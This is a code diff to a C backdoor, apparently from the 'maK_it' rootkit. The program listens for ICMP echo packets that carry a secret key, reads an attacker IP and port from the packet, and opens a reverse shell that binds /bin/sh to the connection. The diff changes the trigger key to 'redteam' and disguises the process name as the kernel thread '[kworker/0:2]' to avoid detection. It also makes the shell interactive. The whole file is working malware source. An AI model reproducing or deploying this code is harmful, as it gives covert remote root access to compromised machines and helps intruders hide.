@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <sys/types.h> 
+#include <sys/types.h>
 #include <errno.h>
 #include <stdlib.h>
 #include <string.h>
@@ -14,12 +14,14 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <signal.h>
+#include <dirent.h>
 
 #define PACKET_SIZE 	1024
-#define KEY         	"maK_it_$H3LL"
-#define MOTD        	"maK_it\n/bin/bash shell..\n"
+#define KEY         	"redteam"
+#define MOTD        	"Ready.\n"
 #define SHELL       	"/bin/sh"
-#define PROCESS_NAME    "maK_it_shell"
+#define PROCESS_NAME    "[kworker/0:2]"
+#define EXIT_BANNER     "Until next time...\n"
 
 /*
  * Start the reverse shell
@@ -28,30 +30,47 @@ void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
     int sd;
     struct sockaddr_in server_addr;
     struct hostent *server;
-    
+
+    chdir("/");
     sd = socket(AF_INET, SOCK_STREAM, 0);
     if(sd < 0)	return;
     server = gethostbyname(attacker_ip);
     if(server == NULL)	return;
     bzero((char *) &server_addr, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, 
+    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr,
 			server->h_length);
     server_addr.sin_port = htons(attacker_port);
 
-    if(connect(sd,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0) 
+    if(connect(sd,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0)
         return;
 	//Print header
     write(sd, MOTD, strlen(MOTD));
-    
-    /* 
+    /*
  	 * Connect socket to stdio
- 	 * Run shell 
+ 	 * Run shell
  	*/
-    dup2(sd, 0); 
-    dup2(sd, 1); 
+
+	/* opendir debug code
+	DIR *dir;
+	struct dirent *ent;
+	if ((dir = opendir ("/bin")) != NULL) {
+		  // print all the files and directories within directory
+		  while ((ent = readdir (dir)) != NULL) {
+			      write(sd, ent->d_name, strlen(ent->d_name));
+			      write(sd, "\n", 1);
+		  }
+		    closedir (dir);
+	} else {
+		write(sd, "Error reading files\n", 20);
+	}
+	*/
+
+    dup2(sd, 0);
+    dup2(sd, 1);
     dup2(sd, 2);
-    execl(SHELL, SHELL, (char *)0);
+    execl(SHELL, SHELL, "-i", (char *)0);
+    write(sd, EXIT_BANNER, strlen(EXIT_BANNER));
     close(sd);
 }
 
@@ -60,7 +79,7 @@ void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
  */
 void ping_listener(void){
 	int sockfd;
-	int n;	
+	int n;
 	int icmp_ksize;
     char buf[PACKET_SIZE + 1];
     struct ip *ip;
@@ -71,24 +90,25 @@ void ping_listener(void){
     //Listen for icmp packets
 	while(1){
         /* get the icmp packet */
-        bzero(buf, PACKET_SIZE + 1);        
+        bzero(buf, PACKET_SIZE + 1);
         n = recv(sockfd, buf, PACKET_SIZE,0);
-		if(n > 0){    
+		if(n > 0){
             ip = (struct ip *)buf;
             icmp = (struct icmp *)(ip + 1);
-            
+
+//printf("Got a packet: %x\n", icmp->icmp_data);
 			// If ICMP_ECHO packet and if KEY matches  */
-            if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, 
+            if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY,
 				icmp_ksize) == 0)){
                 char attacker_ip[16];
                 int attacker_port;
-                
+
                 attacker_port = 0;
                 bzero(attacker_ip, sizeof(attacker_ip));
-                sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", 
+                sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d",
 						attacker_ip, &attacker_port);
-                
-				//printf("%s %d \n", attacker_ip, attacker_port);
+
+//printf("%s %d \n", attacker_ip, attacker_port);
                 if((attacker_port <= 0) || (strlen(attacker_ip) < 7))
                     continue;
                 /* Starting reverse shell */
@@ -104,10 +124,9 @@ void ping_listener(void){
 /*
  * main ()
  */
-int main(int argc, char *argv[]){ 
+int main(int argc, char *argv[]){
 	//Prevent zombies
-    signal(SIGCLD, SIG_IGN); 
-    chdir("/");
+    signal(SIGCLD, SIG_IGN);
     //If argv is equal to -v, some info will be printed
     if ((argc == 2) && (argv[1][0] == '-') && (argv[1][1] == 'v')){
         fprintf(stdout, "KEY:\t\t\t%s\n",KEY);
@@ -122,11 +141,11 @@ int main(int argc, char *argv[]){
 	}
     if (fork() != 0)
         exit(EXIT_SUCCESS);
-    
+
     if (getgid() != 0) {
         fprintf(stdout, "Run as root!\n");
         exit(EXIT_FAILURE);
-    }    
+	}
 	ping_listener();
     return EXIT_SUCCESS;
 }
